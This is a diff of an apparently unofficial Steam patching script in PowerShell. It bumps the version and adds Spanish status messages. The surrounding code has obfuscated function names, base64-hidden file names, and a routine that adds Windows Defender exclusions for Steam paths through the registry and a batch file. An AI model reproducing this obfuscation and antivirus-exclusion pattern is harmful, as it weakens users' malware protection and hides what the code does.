@@ -178,7 +178,7 @@ function New-BufferedPanel {
 
 
 
-$script:version = "V1.36"
+$script:version = "V1.37"
 $errorLogFile = Join-Path $env:TEMP (S("YnNtYXBfZXJyb3IubG9n"))
 
 function WEL {
@@ -2693,7 +2693,7 @@ function Xz9Qk {
         $srChk=$null; try { $srChk=Get-SteamPath } catch {}
         if (Test-ParcheActual $srChk) {
             try { Set-ParcheInstalado $true } catch {}
-            if ($Silent) { return $true }
+            if ($Silent) { try { Write-Host "Parche actual, continuando sin cambios." } catch {}; return $true }
         }
     } catch {}
     $attempt=0
@@ -6364,7 +6364,7 @@ function Add-SteamDefenderExclusions {
             try { $existingExcl = @( (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath ) } catch {}
             if (-not $existingExcl -or $existingExcl.Count -eq 0) { try { $existingExcl = @((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue).PSObject.Properties.Name | Where-Object { $_ -notlike 'PS*' }) } catch {} }
             $exclusions = @($exclusions | Where-Object { $existingExcl -notcontains $_ })
-            if ($exclusions.Count -eq 0) { $script:defenderExclusionsDone = $true; return $true }
+            if ($exclusions.Count -eq 0) { try { Write-Host "[OK] Steam ya esta excluido del antivirus." } catch {}; $script:defenderExclusionsDone = $true; return $true }
             try {
                 $defCut = (Get-Date).AddDays(-7)
                 $fresh = @()
@@ -6377,7 +6377,7 @@ function Add-SteamDefenderExclusions {
                     }
                 }
                 $exclusions = @($exclusions | Where-Object { $fresh -notcontains $_ })
-                if ($exclusions.Count -eq 0) { $script:defenderExclusionsDone = $true; return $true }
+                if ($exclusions.Count -eq 0) { try { Write-Host "[OK] Steam ya esta excluido del antivirus." } catch {}; $script:defenderExclusionsDone = $true; return $true }
             } catch {}
         } catch {}
         $batPath = Join-Path $env:TEMP (S("YnNtYXBfYWRkX2V4Y2x1c2lvbnMuYmF0"))
